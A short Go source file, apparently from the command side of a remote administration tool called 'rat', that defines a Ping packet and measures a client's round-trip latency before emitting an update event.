package main

import (
	"rat/command/utils"
	"rat/shared"
	"time"
)

type Ping struct {
}

func (packet Ping) Header() shared.PacketHeader {
	return shared.PingHeader
}

func (packet Ping) Init(c *Client) {
	c.Ping.Start = time.Now()
	c.Ping.Received = false
}

func (packet Ping) OnReceive(c *Client) error {
	c.Ping.Current = int(utils.GetMilliseconds(time.Now()) - utils.GetMilliseconds(c.Ping.Start))
	c.Ping.Received = true

	update(NewClientEvent(Update, c, ClientData{
		Ping: c.Ping.Current,
	}))

	return nil
}
